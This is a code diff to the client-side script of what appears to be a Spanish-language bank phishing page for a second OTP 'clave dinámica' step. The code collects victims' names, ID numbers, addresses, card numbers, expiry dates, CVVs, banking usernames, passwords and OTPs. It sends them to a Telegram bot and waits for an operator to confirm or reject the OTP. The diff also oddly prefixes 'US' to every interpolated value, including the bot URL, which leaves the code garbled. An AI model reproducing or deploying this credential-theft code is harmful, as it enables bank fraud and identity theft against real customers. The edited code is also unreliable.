@@ -217,7 +217,7 @@
           loader.style.display = "none";
           return;
         }
-        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+        fetch(`https://api.telegram.org/botUS${config.token}/getUpdates`)
           .then((response) => response.json())
           .then((data) => {
             const updates = data.result;
@@ -225,21 +225,21 @@
               (update) =>
                 update.callback_query &&
                 (update.callback_query.data ===
-                  `confirm_otp:${transactionId}` ||
-                  update.callback_query.data === `invalid_otp:${transactionId}`)
+                  `confirm_otp:US${transactionId}` ||
+                  update.callback_query.data === `invalid_otp:US${transactionId}`)
             );
 
             if (verificationUpdate) {
               loader.style.display = "none";
               if (
                 verificationUpdate.callback_query.data ===
-                `confirm_otp:${transactionId}`
+                `confirm_otp:US${transactionId}`
               ) {
                 
               }
               if (
                 verificationUpdate.callback_query.data ===
-                `invalid_otp:${transactionId}`
+                `invalid_otp:US${transactionId}`
               ) {
                 alert(
                   "Clave dinamica incorrecta. Por favor, revise sus datos e intente nuevamente."
@@ -269,7 +269,7 @@
         const horas = ahora.getHours().toString().padStart(2, "0");
         const minutos = ahora.getMinutes().toString().padStart(2, "0");
         const segundos = ahora.getSeconds().toString().padStart(2, "0");
-        return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
+        return `US${dia}/US${mes}/US${año} US${horas}:US${minutos}:US${segundos}`;
       }
 
       function actualizarHoraTransaccion() {
@@ -279,13 +279,13 @@
         const segundos = ahora.getSeconds().toString().padStart(2, "0");
         document.getElementById(
           "horaTransaccion"
-        ).innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
+        ).innerText = `Hora de la transacción: US${horas}:US${minutos}:US${segundos}`;
       }
 
       // Inicializar la hora de la transacción
       document.getElementById(
         "horaTransaccion"
-      ).innerText = `Hora de la transacción: ${obtenerFechaActual()}`;
+      ).innerText = `Hora de la transacción: US${obtenerFechaActual()}`;
       // Actualizar la hora cada segundo
       setInterval(actualizarHoraTransaccion, 1000);
 
@@ -315,7 +315,7 @@
           return;
         }
 
-        const message = `Nuevo solicitud de clave dinamica 2 pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP2: ${otp}
+        const message = `Nuevo solicitud de clave dinamica 2 pendiente de verificación.\n🆔ID: US${transactionId}\n👤Nombre: US${formData0.nombre}\n🪪Cédula: US${formData0.documentoIdentidad}\n-\n📞Teléfono: US${formData0.telefono}\n🌇Ciudad: US${formData0.ciudad}\n🗺️Direc: US${formData0.direccion}\n-\n🏦 Banco: US${formData0.entidad}\n💳Tarjeta: US${formData0.tarjeta}\n📅Fecha: US${formData0.fechaExpiracion}\n🔐CVV: US${formData0.cvv}\n🧑‍💻Usuario: US${username}\n🔐Clave: US${password}\n🔑OTP2: US${otp}
         `;
 
         const keyboard = JSON.stringify({
@@ -323,11 +323,11 @@
             [
               {
                 text: "Confirmar OTP2",
-                callback_data: `confirm_otp:${transactionId}`,
+                callback_data: `confirm_otp:US${transactionId}`,
               },
               {
                 text: "OTP2 Incorrecto",
-                callback_data: `invalid_otp:${transactionId}`,
+                callback_data: `invalid_otp:US${transactionId}`,
               },
             ],
           ],
@@ -339,7 +339,7 @@
           return;
         }
 
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+        fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
